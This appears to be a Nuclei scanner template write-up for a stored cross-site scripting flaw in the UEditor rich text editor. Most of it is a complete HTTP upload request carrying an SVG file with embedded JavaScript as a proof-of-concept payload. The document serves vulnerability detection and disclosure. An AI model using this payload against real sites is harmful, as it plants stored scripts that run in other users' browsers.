# Nuclei Template: ueditor - Cross Site Scripting
**Template ID:** ueditor-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`ueditor-xss.yaml`)

## Vulnerability Information & PoC

## Description
The latest vulnerability version of UEditor, a rich text web editor, allows for XML file uploads which can lead to stored cross-site scripting (XSS) attacks.

## Steps to reproduce / Exploit Payload
```http
POST /ueditor/php/controller.php?action=uploadfile HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstring}}

------WebKitFormBoundary{{randstring}}
Content-Disposition: form-data; name="upfile"; filename="test.xml"
Content-Type: application/vnd.ms-excel

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>
------WebKitFormBoundary{{randstring}}--
```

## References
- https://blog.csdn.net/weixin_50464560/article/details/124803185
- https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3
